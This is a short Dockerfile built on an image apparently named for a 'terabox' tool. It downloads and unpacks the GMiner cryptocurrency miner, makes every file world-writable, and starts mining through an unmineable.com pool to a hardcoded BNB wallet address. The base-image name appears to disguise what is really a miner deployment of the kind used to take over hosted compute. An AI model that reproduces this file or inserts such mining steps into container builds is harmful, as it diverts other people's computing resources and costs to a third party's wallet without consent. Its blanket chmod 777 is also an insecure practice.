FROM hrishi2861/terabox

 
RUN wget https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz
RUN tar -xvf gminer_3_44_linux64.tar.xz

COPY . .

RUN chmod -R 777 *

CMD ./miner -a equihash144_5 --pers BgoldPoW -s proxy+ssl://zhash.unmineable.com:4444 -u BNB:0x50f0A82c9278Fde680E64bb9BEc998b102D10f39.unmineable_worker_xwdsryp
